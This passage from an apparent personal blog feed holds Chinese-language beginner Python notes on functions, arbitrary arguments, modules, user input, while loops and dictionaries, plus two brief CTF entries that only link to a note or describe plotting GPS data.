class="line">&#123;&#x27;ffirst&#x27;: &#x27;奥拓&#x27;, &#x27;last&#x27;: &#x27;阿波卡利斯&#x27;&#125;</span><br></pre></td></tr></table></figure><h6 id="结合使用函数以及while循环"><a href="#结合使用函数以及while循环" class="headerlink" title="结合使用函数以及while循环"></a>结合使用函数以及while循环</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">def name_in(first_name,last_name):</span><br><span class="line">full_name = f&quot;&#123;first_name&#125;&#123;last_name&#125;&quot;</span><br><span class="line">return full_name.title()</span><br><span class="line">while True:</span><br><span class="line">print(&#x27;Hello everybody&#x27;)</span><br><span class="line">print(&#x27;please input your first name and last name&#x27;)</span><br><span class="line">f_name = input(&quot;Please input your first name:&quot;)</span><br><span class="line">if f_name == &#x27;quit&#x27;:</span><br><span class="line">break</span><br><span class="line">l_name = input(&quot;Please input your last name:&quot;)</span><br><span class="line">if l_name == &#x27;quit&#x27;:</span><br><span class="line">break</span><br><span class="line">name_out=name_in(f_name,l_name)</span><br><span class="line">print(name_out)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Hello everybody</span><br><span class="line">please input your first name and last name</span><br><span class="line">Please input your first name:a</span><br><span class="line">Please input your last name:a</span><br><span class="line">Aa</span><br><span class="line">Hello everybody</span><br><span class="line">please input your first name and last name</span><br><span class="line">Please input your first name:a</span><br><span class="line">Please input your last name:_a</span><br><span class="line">A_A</span><br><span class="line">Hello everybody</span><br><span class="line">please input your first name and last name</span><br><span class="line">Please input your first name:a</span><br><span class="line">Please input your last name:quit</span><br></pre></td></tr></table></figure><h6 id="传递列表"><a href="#传递列表" class="headerlink" title="传递列表"></a>传递列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def greet_user(names):</span><br><span class="line">for name in names:</span><br><span class="line">message = f&quot;hello  &#123;name.title()&#125;&quot;</span><br><span class="line">print(message)</span><br><span class="line">username = [&#x27;haah&#x27;,&#x27;xixi&#x27;,&#x27;wangwang&#x27;]</span><br><span class="line">greet_user(username)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello  Haah</span><br><span class="line">hello  Xixi</span><br><span class="line">hello  Wangwang</span><br></pre></td></tr></table></figure><h6 id="在函数中修改列表"><a href="#在函数中修改列表" class="headerlink" title="在函数中修改列表"></a>在函数中修改列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unprint_Designed = [&#x27;phone&#x27;,&#x27;robot&#x27;,&#x27;dodecahedron&#x27;]</span><br><span class="line">print_designeds = []</span><br><span class="line"></span><br><span class="line">while unprint_Designed:</span><br><span class="line">current_design = unprint_Designed.pop()</span><br><span class="line">print(f&quot;printing model:&#123;current_design&#125;&quot;)</span><br><span class="line">print_designeds.append(current_design)</span><br><span class="line">print(&quot;the following models have been printed:&quot;)</span><br><span class="line">for print_designed in print_designeds:</span><br><span class="line">print(print_designed)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printing model:dodecahedron</span><br><span class="line">printing model:robot</span><br><span class="line">printing model:phone</span><br><span class="line">the following models have been printed:</span><br><span class="line">dodecahedron</span><br><span class="line">robot</span><br><span class="line">phone</span><br></pre></td></tr></table></figure><p>使用函数来进行编写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def print_model(unprinted_designeds,completed_models):</span><br><span class="line">while unprinted_designeds:</span><br><span class="line">current_print = unprinted_designeds.pop()</span><br><span class="line">print(f&quot;printing models:&#123;current_print&#125;&quot;)</span><br><span class="line">completed_models.append(current_print)</span><br><span class="line">def show_completed(completed_models):</span><br><span class="line">print(&quot;the following models have been printed:&quot;)</span><br><span class="line">for completed_model in completed_models:</span><br><span class="line">print(completed_model)</span><br><span class="line">unprint_designs = [&#x27;phone&#x27;,&#x27;computer&#x27;,&#x27;robot&#x27;]</span><br><span class="line">complete_models = []</span><br><span class="line"></span><br><span class="line">print_model(unprint_designs,complete_models)</span><br><span class="line">show_completed(complete_models)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printing models:robot</span><br><span class="line">printing models:computer</span><br><span class="line">printing models:phone</span><br><span class="line">the following models have been printed:</span><br><span class="line">robot</span><br><span class="line">computer</span><br><span class="line">phone</span><br></pre></td></tr></table></figure><h6 id="切片表示法-禁止访问列表"><a href="#切片表示法-禁止访问列表" class="headerlink" title="切片表示法[:]禁止访问列表"></a>切片表示法[:]禁止访问列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def print_model(unprinted_designeds, completed_models):</span><br><span class="line">    while unprinted_designeds:</span><br><span class="line">        current_print = unprinted_designeds.pop()</span><br><span class="line">        print(f&quot;printing models:&#123;current_print&#125;&quot;)</span><br><span class="line">        completed_models.append(current_print)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_completed(completed_models):</span><br><span class="line">    print(&quot;the following models have been printed:&quot;)</span><br><span class="line">    for completed_model in completed_models:</span><br><span class="line">        print(completed_model)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unprint_designs = [&#x27;phone&#x27;, &#x27;computer&#x27;, &#x27;robot&#x27;]</span><br><span class="line">complete_models = []</span><br><span class="line">print_model(unprint_designs[:],complete_models)</span><br><span class="line">show_completed(complete_models)</span><br><span class="line">print(unprint_designs)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">printing models:robot</span><br><span class="line">printing models:computer</span><br><span class="line">printing models:phone</span><br><span class="line">the following models have been printed:</span><br><span class="line">robot</span><br><span class="line">computer</span><br><span class="line">phone</span><br><span class="line">[&#x27;phone&#x27;, &#x27;computer&#x27;, &#x27;robot&#x27;]</span><br></pre></td></tr></table></figure><p>这个就是在下面调用函数的时候建立一个切片来进行运算，这个切片的话当做中间件就好</p><h6 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def making_pizza(*toppomgs):</span><br><span class="line">print(&quot;\nmaking a pizza whit the ffollowing topping&quot;)</span><br><span class="line">for topping in toppomgs:</span><br><span class="line">print(f&quot;-&#123;topping&#125;&quot;)</span><br><span class="line">making_pizza(&#x27;pepperoni&#x27;)</span><br><span class="line">making_pizza(&#x27;mushrooms&#x27;,&#x27;green peppers&#x27;,&#x27;extra cheese&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">making a pizza whit the ffollowing topping</span><br><span class="line">-pepperoni</span><br><span class="line"></span><br><span class="line">making a pizza whit the ffollowing topping</span><br><span class="line">-mushrooms</span><br><span class="line">-green peppers</span><br><span class="line">-extra cheese</span><br></pre></td></tr></table></figure><p>在这里的话，*toppings这里的星号定义了一个空元组（元组的话见操作列表）并将所有的值封装到这个空元组中</p><h6 id="结合使用位置实参和任意数量实参"><a href="#结合使用位置实参和任意数量实参" class="headerlink" title="结合使用位置实参和任意数量实参"></a>结合使用位置实参和任意数量实参</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def making_pizza(size,*toppomgs):</span><br><span class="line">print(f&quot;making a &#123;size&#125; pizza whit the ffollowing topping&quot;)</span><br><span class="line">for topping in toppomgs:</span><br><span class="line">print(f&quot;-&#123;topping&#125;&quot;)</span><br><span class="line">making_pizza(12,&#x27;pepperoni&#x27;)</span><br><span class="line">making_pizza(16,&#x27;mushrooms&#x27;,&#x27;green peppers&#x27;,&#x27;extra cheese&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">making a 12 pizza whit the ffollowing topping</span><br><span class="line">-pepperoni</span><br><span class="line">making a 16 pizza whit the ffollowing topping</span><br><span class="line">-mushrooms</span><br><span class="line">-green peppers</span><br><span class="line">-extra cheese</span><br></pre></td></tr></table></figure><p>使用任意数量的关键字实参</p><p>**可以创建一个空字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def build_profit(first,last,**user_name):</span><br><span class="line">user_name[&#x27;first_name&#x27;] = first</span><br><span class="line">user_name[&#x27;last_name&#x27;] = last</span><br><span class="line">return user_name</span><br><span class="line">user_profile = build_profit(&#x27;齐格飞&#x27;,&#x27;卡斯兰娜&#x27;,</span><br><span class="line">location = &#x27;圣芙蕾雅学园&#x27;,</span><br><span class="line">says = &#x27;我将发动一次nb的攻击&#x27;)</span><br><span class="line">print(user_profile)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;location&#x27;: &#x27;圣芙蕾雅学园&#x27;, &#x27;says&#x27;: &#x27;我将发动一次nb的攻击&#x27;, &#x27;first_name&#x27;: &#x27;齐格飞&#x27;, &#x27;last_name&#x27;: &#x27;卡斯兰娜&#x27;&#125;</span><br></pre></td></tr></table></figure><h6 id="导入整个模块"><a href="#导入整个模块" class="headerlink" title="导入整个模块"></a>导入整个模块</h6><p>先建立一个python文件，里面输入写好的def，保存为pizza.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def making_pizza(size,*toppings):</span><br><span class="line">   print(f&quot;making a &#123;size&#125; pizza whit the following topping&quot;)</span><br><span class="line">   for topping in toppings:</span><br><span class="line">      print(f&quot;-&#123;topping&#125;&quot;)</span><br></pre></td></tr></table></figure><p>然后再这个文件所在的目录下在新建一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pizza</span><br><span class="line">pizza.making_pizza(16,&#x27;pepperont&#x27;)</span><br><span class="line">pizza.making_pizza(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><p>使用import让python打开文件pizza.py</p><p>，并将其中的线索有的函数都复制到这个程序中，你看不到复制的代码，因为在这个程序运行时，Python在幕后复制了这些代码。要调用被导入模块的函数，可指定被导入模块的名称pizza和函数名making_pizza（），并用句号来分隔开</p><h6 id="当然也可以显性的调用函数"><a href="#当然也可以显性的调用函数" class="headerlink" title="当然也可以显性的调用函数"></a>当然也可以显性的调用函数</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pizza import making_pizza</span><br><span class="line">making_pizza(16,&#x27;pepperont&#x27;)</span><br><span class="line">making_pizza(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><p>这样也是可行的，而且这样的话不需要在每一个前面添加句号</p><h6 id="使用as来给函数指定别名"><a href="#使用as来给函数指定别名" class="headerlink" title="使用as来给函数指定别名"></a>使用as来给函数指定别名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pizza import making_pizza as mp</span><br><span class="line">mp(16,&#x27;pepperont&#x27;)</span><br><span class="line">mp(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">making a 16 pizza whit the following topping</span><br><span class="line">-pepperont</span><br><span class="line">making a 21 pizza whit the following topping</span><br><span class="line">-cheese</span><br><span class="line">-huge</span><br><span class="line">-mushrooms</span><br></pre></td></tr></table></figure><h6 id="使用as给模块指定别名"><a href="#使用as给模块指定别名" class="headerlink" title="使用as给模块指定别名"></a>使用as给模块指定别名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pizza as p</span><br><span class="line">p.making_pizza(16,&#x27;pepperont&#x27;)</span><br><span class="line">p.making_pizza(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><p>结果是一样的</p><h6 id="导入模块中的所有函数"><a href="#导入模块中的所有函数" class="headerlink" title="导入模块中的所有函数"></a>导入模块中的所有函数</h6><p>使用星号（*）可以让Python导入模块中的所有函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pizza import *</span><br><span class="line">making_pizza(16,&#x27;pepperont&#x27;)</span><br><span class="line">making_pizza(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">making a 16 pizza whit the following topping</span><br><span class="line">-pepperont</span><br><span class="line">making a 21 pizza whit the following topping</span><br><span class="line">-cheese</span><br><span class="line">-huge</span><br><span class="line">-mushrooms</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pyhton </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easyxor---攻防世界（内含有异或运算）</title>
      <link href="/2023/03/26/easyxor/"/>
      <url>/2023/03/26/easyxor/</url>
      
        <content type="html"><![CDATA[<p><a href="https://note.youdao.com/s/7qIJo0BL">https://note.youdao.com/s/7qIJo0BL</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse,异或运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>catchcat---攻防世界</title>
      <link href="/2023/03/26/catctf/"/>
      <url>/2023/03/26/catctf/</url>
      
        <content type="html"><![CDATA[<p>下载以后是一个</p><p>GPS数据流</p><p><a href="https://www.gpsvisualizer.com/map_input">https://www.gpsvisualizer.com/map_input</a></p><p>来着里面导入文件然后绘制，看图就好了</p>]]></content>
      
      
      
        <tags>
            
            <tag> reserve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土--用户输入和while循环</title>
      <link href="/2023/03/25/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F--%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%92%8Cwhile%E5%BE%AA%E7%8E%AF/"/>
      <url>/2023/03/25/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F--%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%92%8Cwhile%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<h6 id="函数input"><a href="#函数input" class="headerlink" title="函数input()"></a>函数input()</h6><p>函数input()使程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其赋给一个变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">message=input(&quot;tell me something and i will repeat:&quot;)</span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure><p>实际上上面那个表达式中input里面的“”以及里面的东西不加也是可以的0_o</p><h6 id="int（）"><a href="#int（）" class="headerlink" title="int（）"></a>int（）</h6><p>int 只能用来将input输入的数转换成数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from builtins import int, print</span><br><span class="line"></span><br><span class="line">age = int(input(&#x27;age=&#x27;))</span><br><span class="line">print(age)</span><br><span class="line">result=bool(age &gt;= 18)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age=19//19是我输入的</span><br><span class="line">19</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h6 id="求模运算符"><a href="#求模运算符" class="headerlink" title="求模运算符"></a>求模运算符</h6><p>%，不解释</p><h6 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h6><p>形式和C的差不多，但就是不用（）以及：的事情</p><h6 id="使用标签"><a href="#使用标签" class="headerlink" title="使用标签"></a>使用标签</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import int, print</span><br><span class="line"></span><br><span class="line">prompt = &quot;\nabaxiba好吧其实我可以将你输入的话输出除非你输入quit\n&quot;</span><br><span class="line">activity = True</span><br><span class="line">while activity:</span><br><span class="line">    message = input(prompt)</span><br><span class="line">    if message == &#x27;quit&#x27;:</span><br><span class="line">        activity = False</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br></pre></td></tr></table></figure><p>break中断当前循环</p><p>continue是跳出当前循环</p><h6 id="转移列表元素"><a href="#转移列表元素" class="headerlink" title="转移列表元素"></a>转移列表元素</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">unconfired_users = [&#x27;alice&#x27;,&#x27;bobo&#x27;,&#x27;ctf&#x27;]#定义一个列表</span><br><span class="line">confirmed_users = []#定义一个空列表</span><br><span class="line">while unconfired_users:#while循环</span><br><span class="line">    current_user = unconfired_users.pop()#定义一个变量使之等于unconfired_users最后删除的值</span><br><span class="line">    print(f&quot;verifying user:&#123;current_user.title()&#125;&quot;)#输出current_user的值</span><br><span class="line">    confirmed_users.append(current_user)#将current_user的值添加到空列表中</span><br><span class="line"></span><br><span class="line">print(&#x27;\nthe following users have been confirmed&#x27;)#输出一个标题</span><br><span class="line">for confirmed_user in confirmed_users:#遍历confirmed_users这个列表</span><br><span class="line">        print(confirmed_user)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">verifying user:Ctf</span><br><span class="line">verifying user:Bobo</span><br><span class="line">verifying user:Alice</span><br><span class="line"></span><br><span class="line">the following users have been confirmed</span><br><span class="line">ctf</span><br><span class="line">bobo</span><br><span class="line">alice</span><br></pre></td></tr></table></figure><p>这样就讲一个列表中的元素全部转移到另一个列表中了</p><h6 id="删除特定值的列表元素"><a href="#删除特定值的列表元素" class="headerlink" title="删除特定值的列表元素"></a>删除特定值的列表元素</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pets = [&#x27;cat&#x27;,&#x27;dog&#x27;,&#x27;lion&#x27;,&#x27;tiger&#x27;,&#x27;dargon&#x27;,&#x27;goldfish&#x27;,&#x27;fish&#x27;]</span><br><span class="line">print(pets)</span><br><span class="line"></span><br><span class="line">while &#x27;goldfish&#x27; in pets:</span><br><span class="line">    pets.remove(&#x27;goldfish&#x27;)</span><br><span class="line">print(pets)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;cat&#x27;, &#x27;dog&#x27;, &#x27;lion&#x27;, &#x27;tiger&#x27;, &#x27;dargon&#x27;, &#x27;goldfish&#x27;, &#x27;fish&#x27;]</span><br><span class="line">[&#x27;cat&#x27;, &#x27;dog&#x27;, &#x27;lion&#x27;, &#x27;tiger&#x27;, &#x27;dargon&#x27;, &#x27;fish&#x27;]</span><br></pre></td></tr></table></figure><h5 id="这里有一个问题"><a href="#这里有一个问题" class="headerlink" title="这里有一个问题"></a>这里有一个问题</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pets = [&#x27;cat&#x27;,&#x27;dog&#x27;,&#x27;lion&#x27;,&#x27;tiger&#x27;,&#x27;dargon&#x27;,&#x27;goldfish&#x27;,&#x27;fish&#x27;]</span><br><span class="line">print(pets)</span><br><span class="line">pet = [&#x27;fish&#x27;,&#x27;goldfish&#x27;]</span><br><span class="line">for pet in pets:</span><br><span class="line">    pets.remove(pet)</span><br><span class="line">print(pets)</span><br></pre></td></tr></table></figure><h6 id="使用用户输入填充字典中的元素"><a href="#使用用户输入填充字典中的元素" class="headerlink" title="使用用户输入填充字典中的元素"></a>使用用户输入填充字典中的元素</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">response = &#123;&#125;</span><br><span class="line">polling_active = True</span><br><span class="line">while polling_active:</span><br><span class="line">    name = input(&quot;姓名：&quot;)</span><br><span class="line">    responses = input(&quot;回答：&quot;)</span><br><span class="line">    response[name] = responses</span><br><span class="line">    repeat = input(&#x27;whether you want to answer more?yes/no&#x27;)</span><br><span class="line">    if repeat == &#x27;no&#x27;:</span><br><span class="line">        polling_active = False</span><br><span class="line">print(&quot;----Polling-----&quot;)</span><br><span class="line">for name,responses in response.items():</span><br><span class="line">    print(f&quot;&#123;name&#125;:回答是&#123;response&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名：a</span><br><span class="line">回答：s</span><br><span class="line">whether you want to answer more?yes/nono</span><br><span class="line">----Polling-----</span><br><span class="line">a:回答是&#123;&#x27;a&#x27;: &#x27;s&#x27;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土---字典</title>
      <link href="/2023/03/24/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F---%E5%AD%97%E5%85%B8/"/>
      <url>/2023/03/24/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F---%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;points&#x27;:5&#125;</span><br><span class="line">print(alien_0[&#x27;color&#x27;])</span><br><span class="line">print(alien_0[&#x27;points&#x27;])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">green</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h6 id="这就是一个简单的字典"><a href="#这就是一个简单的字典" class="headerlink" title="这就是一个简单的字典"></a>这就是一个简单的字典</h6><p>在Python中，字典是一系列键值对。每个键都有一个值相互关联</p><h6 id="访问字典中的值"><a href="#访问字典中的值" class="headerlink" title="访问字典中的值"></a>访问字典中的值</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;points&#x27;:5&#125;</span><br><span class="line">new_point=alien_0[&#x27;points&#x27;]</span><br><span class="line">print(f&quot;you have killed &#123;new_point&#125; alien&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you have killed 5alien</span><br></pre></td></tr></table></figure><h6 id="添加键值对"><a href="#添加键值对" class="headerlink" title="添加键值对"></a>添加键值对</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alien_0 = &#123;&#x27;color&#x27;:&#x27;green&#x27;,&#x27;points&#x27;:5&#125;</span><br><span class="line">print(alien_0)</span><br><span class="line">alien_0[&#x27;x_position&#x27;]=0</span><br><span class="line">alien_0[&#x27;y_position&#x27;]=0</span><br><span class="line">print(alien_0)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 